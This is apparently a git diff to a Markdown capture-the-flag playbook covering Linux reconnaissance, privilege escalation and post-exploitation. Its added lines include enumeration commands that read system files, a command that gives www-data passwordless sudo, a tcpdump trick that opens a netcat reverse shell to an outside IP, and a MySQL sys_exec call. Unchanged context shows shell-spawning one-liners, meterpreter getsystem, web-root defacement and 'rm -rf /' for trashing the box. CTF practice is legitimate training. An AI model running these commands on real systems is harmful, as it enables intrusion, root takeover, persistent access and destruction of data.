@@ -171,20 +171,30 @@ Successful gain unauthorized access
 [![alt text](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Logo Title Text 1")](#reconnaissance-4)
 
 # Reconnaissance 4
-Gather additional information previously unattainable
+Gather additional information previously unattainable. Some of these will overlap with renumeration rechniques described in the [Priv Escalation Playset](#priviledge-escalation)
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#command-and-gittroll-(cg2)) [![Alt text](/images/ctf-back-button.png "Previous Play")](#reconnaissance-2)
 
 
 ``` bash
 $ history 
-strings [filename.extension]
-file [filename.extension]
-ps aux
-who
-uname -a 
-printenv
-netstat -natup
+$ netstat -ano
+$ strings [filename.extension]
+$ file [filename.extension]
+$ ps aux
+$ who
+$ uname -a 
+$ printenv
+$ netstat -natup
+$ ps aux | grep root
+$ sudo -l
+$ sudo su -l
+$ cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release;
+$ cat /proc/version; uname -a; uname -mrs; rpm -q kernel; dmesg | grep Linux; ls /boot | grep vmlinuz-; file /bin/ls; cat /etc/lsb-release
+$ cat /etc/profile; cat /etc/bashrc; cat ~/.bash_profile; cat ~/.bashrc; cat ~/.bash_logout; env; set
+$ mount; df -h; cat /etc/fstab
 
+
+# look at cronjobs that runs as root with incorrect permissions
 ```
 
 # Command and GitTroll (CG2) 
@@ -194,8 +204,18 @@ Establish a lasting backdoor
 If you really wanted to test this ability. You can use [Merlin](https://github.com/Ne0nd0g/merlin). This is out of scope for boot to root CTF competitions, but has some potential functionality in larger format events.
 
 # Priviledge Escalation 
-Escalate to root  
+Escalate to root  . [See Credit](#credit-and-resources)
 [![Alt text](/images/ctf-playbook-icon.png "Play Icon")](#actions-on-objectives)  
+
+__Manual Testing__
+```bash
+sudo su -
+sudo -l
+ps aux | grep root
+
+#Add user www-data to sudoers with no password
+$ echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
+```
 
 __If You have a Reverse Shell...__
 ```bash
@@ -225,8 +245,19 @@ $ /bin/sh -i
 $ exec "/bin/sh";
 
 $ perl —e 'exec "/bin/sh";'
-```
 
+#From within tcpdump
+$ echo $’id\n/bin/netcat $ip 443 -e /bin/bash’ > /tmp/.test
+chmod +x /tmp/.test
+sudo tcpdump -ln -I eth- -w /dev/null -W 1 -G 1 -z /tmp/.tst -Z root
+
+```
+__Exploiting Services__
+```bash
+#MySQL
+sys_exec('usermod -a -G admin username')
+
+```
 __Metasploit__
 ``` bash
 meterpreter: $ getsystem
@@ -266,7 +297,7 @@ rm -r /var/www
 cp victory-mark /var/www/
 
 ```  
-2.  Trash the box, !VERY dangerous, you've been warned  [#trashthebox](https://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/)
+2.  Trash the box, !VERY dangerous, you've been warned. Research has not been done to determine if trashing a VM on your local host will effect your local host. [#trashthebox](https://www.tecmint.com/10-most-dangerous-commands-you-should-never-execute-on-linux/)
 ```bash
 # Carnage (don't run this on anything you care about, you've been warned)
 $ rm -rf /
@@ -291,7 +322,7 @@ There are countless resources and people who deserve credit for their contributi
 +  Credit and Resources  
     -    [CheatSheet God](https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_PenTesting.txt)
     -    [Adam P](https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png) : Logo
-    -    [Guif: Priv Escalation](https://guif.re/linuxeops)
+    -    [Guif: Priv Escalation](https://guif.re/linuxeops): One of the best resources I've found for raw scripts on Priv Esc. Thanks!
 
 
 [logo]: https://github.com/adam-p/markdown-here/raw/master/src/common/images/icon48.png "Next Play" 
